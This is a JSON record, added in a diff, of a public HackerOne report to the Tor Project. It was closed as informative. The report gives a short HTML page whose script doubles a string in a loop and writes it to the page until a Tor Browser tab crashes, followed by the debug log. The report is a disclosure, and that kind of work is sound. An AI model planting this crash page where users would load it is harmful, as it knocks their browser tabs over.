@@ -1,0 +1,119 @@
+{
+  "id": 281682,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODE2ODI=",
+  "url": "https://hackerone.com/reports/281682",
+  "title": "Crashes/Buffer at 0x2C0086,name=PBrowser::Msg_Destroy ",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2017-10-22T09:24:25.700Z",
+  "submitted_at": "2017-10-22T09:24:25.700Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dhiraj-mishra",
+    "url": "/dhiraj-mishra",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/049/455/364f57d6fe4bbc9ead49c2648dacc68f89a3089b_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1800,
+    "url": "https://hackerone.com/torproject",
+    "handle": "torproject",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Tor",
+      "twitter_handle": "torproject",
+      "website": "https://www.torproject.org/",
+      "about": "Anonymity Online"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-10-24T09:42:01.243Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-24T07:58:44.738Z",
+  "team_member_agreed_on_going_public_at": "2017-10-24T09:42:01.201Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Team, \n\nSteps to Reproduce: \n1. Open Tor \n2. Navigate to string.html\nWhere string.html :\n```\n<script>\nfunction tor()\n {\n  \n    var uristring = unescape(\"%u4141%u4141\");\n      \n    for(i=0; i <= 50 ; ++i) \n {\n        uristring+=uristring;\n        document.write(uristring);\n    }    \n    document.write(uristring);\n}\n</script>\n</head>\n<body onload=\"tor()\">\n</body>\n```\n3. 'Gah! This tab has crashed.\n\nHowever, running it to debug mode generates the below exception :\n\n```\n###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv\n\n[Parent 23125] WARNING: waitpid failed pid:23182 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268\nUnable to update the static FcBlanks: 0x0600\nUnable to update the static FcBlanks: 0x0601\nUnable to update the static FcBlanks: 0x0602\nUnable to update the static FcBlanks: 0x0603\nUnable to update the static FcBlanks: 0x06dd\nUnable to update the static FcBlanks: 0x070f\nUnable to update the static FcBlanks: 0x2028\nUnable to update the static FcBlanks: 0x2029\nUnable to update the static FcBlanks: 0xfff9\nUnable to update the static FcBlanks: 0xfffa\nUnable to update the static FcBlanks: 0xfffb\n[Parent 23125] WARNING: pipe error (58): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322\n[Parent 23125] WARNING: pipe error (54): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322\n\n###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv\n\n[Parent 23125] WARNING: waitpid failed pid:23224 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268 \n```\n\nWFM in Debain attaching string.html and PoC for reference, request you to please have a look.\n\n\n\n\n\nRegards\nDhiraj  ",
+  "weakness": {
+    "id": 3,
+    "name": "Classic Buffer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 231581,
+      "file_name": "string.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/231/581/ef2670bd284815e8b3571dee847c06e08894f72d/string.html?response-content-disposition=attachment%3B%20filename%3D%22string.html%22%3B%20filename%2A%3DUTF-8%27%27string.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3IMMHD7U%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125303Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDckwknQq7fjHwY7%2FK9F%2BtvO9fLJDuG1NEZXXMxYw8hbwIhAM3er0SlLN2AYaRXWazeiwtSjADmim0DnY8YcGf4Y8SxKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5Igww2o2qmJ5MWkfa74sqjgUMDHXvf3xxgarNNUDSIN7iuGoSARtn65gvdJ4%2BO%2FkXeF39tTNpPNp3gbMxN08cJsUGQsiwR96l9CPUzLY7LHBxHFojvFr3ITM3J4EJtd3JktNeEkJgVr%2FsEnXuvSlNfFhDmvSEfMGUHb4UbVaVoFQ4SNJecAghbZ4R2R6eho8SeZVEYbq749PMxfWZg3uRG8JgtVyqoY1jpCk0kh4f43bzUZ6Tk0NwL6H2YD1r28GPSdM2NMS0DQHVK52MQWqHFxqvZOB0JavCD6yzZmm375qMFj70T9kjeA3ygDsQWnINhhNEokIipgBb9big4jerkxPZKXHkMEn8kTRjdpaGnqT31eS2Ap3%2BS%2B4%2BDmGqYt5cnry1J7sVtfs6SJBo2KwCm3ieX3J9ZiFPRwbpDrCFs0h81ZvXr03wFCruJw3pNftO4v61HT2vFYwafngQ66iRf4ccw2WitEv8dDqy88fiyfo8PkzIKNQIGf7F%2FGVErGB7zEj7qRAyMBXCY0PP4WHQscGLLucR9RYE1pVgzzs3BCA9j6D9M6C2DUCcO%2BW%2BQmZSaDSPS08WMv4oYHFXYggOIv%2FTINF9J4pMXNDPjCxtu2OWtH7uHoi1NNCNlUe9xnu5aYimPddy8D73j8KGddAo1w6IoKy4kpqEs8NU%2BXnLLIo%2F8OkgGBLEwmIu9T%2Bu6Oz7XkrYifOXYMDpFUfwTPN9W4JsrMXt%2F3wugpQN4Fk4kWsib7XEy1iPAo764glVM3P7J4XVtoYVee04ZiKms2%2FCu1rNFAWnpdtEP6RHFeEvOqGBX9C3g9xvfaapxWX1FccdWfkK68y%2Bh%2FMy24XhzUb14mI24ZTU9zIXOy%2BHFqYVkAOt7UQ1Gb4HE6VcsU%2B8JXcw5bStrgY6sAE07AhFgeocUOJkN2I%2Fu89%2FcNWBSx3BcejUfJX3Y1%2FMNQpv784p5QFf%2BWHp0%2BUGiFxL%2FYZ7bz0IANiUOzMv59zqaW%2FP4WOMYPVgyzZAVw3B2h%2B4laP9i2zcnD6y1B8D0yz1mg3ghUGJo8C0Z5LhCaAHi7hr3CmQatY39rwKj4%2BzrrqtAaWIIqOwkXgJ89Q5MnwR3YpKSnVnS%2BtFWl0%2BIltP2OXBDv%2Fq7N9nB1%2FEoAh%2FZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=40df1088488f0ee138c86601f686cf809d72496156c7300d5c289b79d86bc2d1",
+      "file_size": 271,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 231582,
+      "file_name": "Tor.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/231/582/eebf6cd3a8571d43b2deb50ffaece32ba7a4a7d9/Tor.mp4?response-content-disposition=attachment%3B%20filename%3D%22Tor.mp4%22%3B%20filename%2A%3DUTF-8%27%27Tor.mp4&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3IMMHD7U%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125303Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDckwknQq7fjHwY7%2FK9F%2BtvO9fLJDuG1NEZXXMxYw8hbwIhAM3er0SlLN2AYaRXWazeiwtSjADmim0DnY8YcGf4Y8SxKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5Igww2o2qmJ5MWkfa74sqjgUMDHXvf3xxgarNNUDSIN7iuGoSARtn65gvdJ4%2BO%2FkXeF39tTNpPNp3gbMxN08cJsUGQsiwR96l9CPUzLY7LHBxHFojvFr3ITM3J4EJtd3JktNeEkJgVr%2FsEnXuvSlNfFhDmvSEfMGUHb4UbVaVoFQ4SNJecAghbZ4R2R6eho8SeZVEYbq749PMxfWZg3uRG8JgtVyqoY1jpCk0kh4f43bzUZ6Tk0NwL6H2YD1r28GPSdM2NMS0DQHVK52MQWqHFxqvZOB0JavCD6yzZmm375qMFj70T9kjeA3ygDsQWnINhhNEokIipgBb9big4jerkxPZKXHkMEn8kTRjdpaGnqT31eS2Ap3%2BS%2B4%2BDmGqYt5cnry1J7sVtfs6SJBo2KwCm3ieX3J9ZiFPRwbpDrCFs0h81ZvXr03wFCruJw3pNftO4v61HT2vFYwafngQ66iRf4ccw2WitEv8dDqy88fiyfo8PkzIKNQIGf7F%2FGVErGB7zEj7qRAyMBXCY0PP4WHQscGLLucR9RYE1pVgzzs3BCA9j6D9M6C2DUCcO%2BW%2BQmZSaDSPS08WMv4oYHFXYggOIv%2FTINF9J4pMXNDPjCxtu2OWtH7uHoi1NNCNlUe9xnu5aYimPddy8D73j8KGddAo1w6IoKy4kpqEs8NU%2BXnLLIo%2F8OkgGBLEwmIu9T%2Bu6Oz7XkrYifOXYMDpFUfwTPN9W4JsrMXt%2F3wugpQN4Fk4kWsib7XEy1iPAo764glVM3P7J4XVtoYVee04ZiKms2%2FCu1rNFAWnpdtEP6RHFeEvOqGBX9C3g9xvfaapxWX1FccdWfkK68y%2Bh%2FMy24XhzUb14mI24ZTU9zIXOy%2BHFqYVkAOt7UQ1Gb4HE6VcsU%2B8JXcw5bStrgY6sAE07AhFgeocUOJkN2I%2Fu89%2FcNWBSx3BcejUfJX3Y1%2FMNQpv784p5QFf%2BWHp0%2BUGiFxL%2FYZ7bz0IANiUOzMv59zqaW%2FP4WOMYPVgyzZAVw3B2h%2B4laP9i2zcnD6y1B8D0yz1mg3ghUGJo8C0Z5LhCaAHi7hr3CmQatY39rwKj4%2BzrrqtAaWIIqOwkXgJ89Q5MnwR3YpKSnVnS%2BtFWl0%2BIltP2OXBDv%2Fq7N9nB1%2FEoAh%2FZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7a9fcafedd853701fcf606869fdd2f6ee465a0c2c620083a6c3fcde6a7a91185",
+      "file_size": 2676752,
+      "type": "video/x-matroska",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
